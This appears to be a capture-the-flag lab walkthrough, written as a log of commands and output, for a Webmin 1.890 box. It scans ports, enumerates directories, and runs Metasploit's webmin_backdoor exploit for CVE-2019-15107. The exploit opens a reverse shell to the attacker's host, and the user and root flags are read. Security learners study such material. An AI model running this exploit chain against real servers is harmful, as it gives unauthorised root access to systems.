@@ -1,0 +1,218 @@
+SOURCE.
+
+
+
+
+[1. ENUMERATION: PORTS]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.88.244
+[OUTPUT]
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+[2. EXPLORING: http server]
+[ACTION: visit http://10.10.88.244:10000/]
+[OUTPUT]
+Error - Document follows
+This web server is running in SSL mode. Try the URL https://ip-10-10-88-244.eu-west-1.compute.internal:10000/ instead.
+
+
+[ACTION: visit https://ip-10-10-88-244.eu-west-1.compute.internal:10000/]
+[OUTPUT]
+This site can’t be reached
+Check if there is a typo in ip-10-10-88-244.eu-west-1.compute.internal.
+DNS_PROBE_FINISHED_NXDOMAIN
+
+
+[NOTE]
+The direction ip-10-10-88-244.eu-west-1.compute.internal can't be accessed externally, since it is an internal aws ec2 hostname.
+This means we should try to just access applying ssl (changing http to https).
+[ACTION: visit https://10.10.88.244:10000/]
+[OUTPUT]
+ Webmin
+You must enter a username and password to login to the server on 10.10.88.244
+
+Username
+Password
+ Remember me
+[NOTE]
+Looks like we need to at least find a username if we want to bruteforce the login.
+
+
+
+[3. ENUMERATION: directories]
+[ACTION: gobuster scan for common directories]
+gobuster dir -u https://10.10.88.244:10000 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+Error: error on running gobuster: unable to connect to https://10.10.88.244:10000/: Get "https://10.10.88.244:10000/": tls: failed to verify certificate: x509: certificate has expired or is not yet valid: current time 2025-07-27T16:06:51+02:00 is after 2025-06-25T04:42:03Z
+[NOTE]
+This means we need to set the option to ignore the ssl cert (--no-tls-validation).
+
+
+[ACTION: gobuster scan for common directories (attempt 2)]
+gobuster dir -u https://10.10.88.244:10000 -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-tls-validation
+[OUTPUT]
+Error: the server returns a status code that matches the provided options for non existing urls. https://10.10.88.244:10000/3f49f4ab-d7cf-4004-8710-c00ab51b477b => 200 (Length: 3726). To continue please exclude the status code or the length
+[NOTE]
+As the error asks us to do, we will exclude replies with length 3726 (--exclude-length 3726).
+
+
+[ACTION: gobuster scan for common directories (attempt 3)]
+gobuster dir -u https://10.10.88.244:10000 -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-tls-validation --exclude-length 3726
+[OUTPUT]
+/favicon.ico          (Status: 200) [Size: 2115]
+/robots.txt           (Status: 200) [Size: 26]
+[NOTE]
+There is nothing useful in robots.txt
+It looks like we are at a dead end.
+However, we can put together some clues to find the next step:
+1. The room name is source.
+2. Description says to exploit a vuln to hack into webmin.
+So we probably are at the right spot right now, which is just knowing where the portal is at, with no credentials to log in.
+Logically, our next step is to research exploits.
+
+
+[ACTION: research exploits for webmin 1.890]
+I found an interesting exploit https://www.rapid7.com/db/vulnerabilities/http-webmin-cve-2019-15107/, which has CVE-2019-15107.
+It works on v1.890-1.920. So it should work on our target.
+Linked in references, I find https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection/vuln-details?referrer=search.
+There, the required metasploit module is mentioned: exploit/linux/http/webmin_backdoor (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb)
+
+
+[ACTION: get more info on exploit]
+msfconsole
+use exploit/linux/http/webmin_backdoor
+info
+[OUTPUT]
+  Name: Webmin password_change.cgi Backdoor
+     Module: exploit/linux/http/webmin_backdoor
+   Platform: Unix, Linux
+       Arch: cmd, x86, x64
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2019-08-10
+
+Provided by:
+  AkkuS
+  wvu <wvu@metasploit.com>
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic (Unix In-Memory)
+      1   Automatic (Linux Dropper)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:h
+                                        ost:port[,type:host:port][...]
+                                        . Supported proxies: sapni, so
+                                        cks4, socks5, socks5h, http
+  RHOSTS                      yes       The target host(s), see https:
+                                        //docs.metasploit.com/docs/usi
+                                        ng-metasploit/basics/using-met
+                                        asploit.html
+  RPORT      10000            yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing
+                                         connections
+  SSLCert                     no        Path to a custom SSL certifica
+                                        te (default is randomly genera
+                                        ted)
+  TARGETURI  /                yes       Base path to Webmin
+  URIPATH                     no        The URI to use for this exploi
+                                        t (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interf
+                                      ace to listen on. This must be a
+                                      n address on the local machine o
+                                      r 0.0.0.0 to listen on all addre
+                                      sses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  This module exploits a backdoor in Webmin versions 1.890 through 1.920.
+  Only the SourceForge downloads were backdoored, but they are listed as
+  official downloads on the project's site.
+
+  Unknown attacker(s) inserted Perl qx statements into the build server's
+  source code on two separate occasions: once in April 2018, introducing
+  the backdoor in the 1.890 release, and in July 2018, reintroducing the
+  backdoor in releases 1.900 through 1.920.
+
+  Only version 1.890 is exploitable in the default install. Later affected
+  versions require the expired password changing feature to be enabled.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2019-15107
+  http://www.webmin.com/exploit.html
+  https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
+  https://blog.firosolutions.com/exploits/webmin/
+  https://github.com/webmin/webmin/issues/947
+[NOTE]
+We got even more confirmation that our exploit should work, since v1.890 has no requirements from the default install.
+
+[NOTE]
+First time around, I forgot to set ssl to true.
+It is required since the link is accessed via https (even if there is no ssl cert).
+[ACTION: complete parameters and run exploit]
+set LHOST 10.23.25.109
+set RHOSTS 10.10.88.244
+set SSL true
+[OUTPUT]
+msf6 exploit(linux/http/webmin_backdoor) > run
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (10.23.25.109:4444 -> 10.10.88.244:46954) at 2025-07-27 16:30:16 +0200
+
+
+[ACTION: stabilize shell]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+[ACTION: find user flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/dark/user.txt
+
+
+[ACTION: check user flag]
+cat /home/dark/user.txt
+[OUTPUT]
+THM{SUPPLY_CHAIN_COMPROMISE}
+
+
+[ACTION: check root flag]
+cat /root/root.txt
+[OUTPUT]
+THM{UPDATE_YOUR_INSTALL}
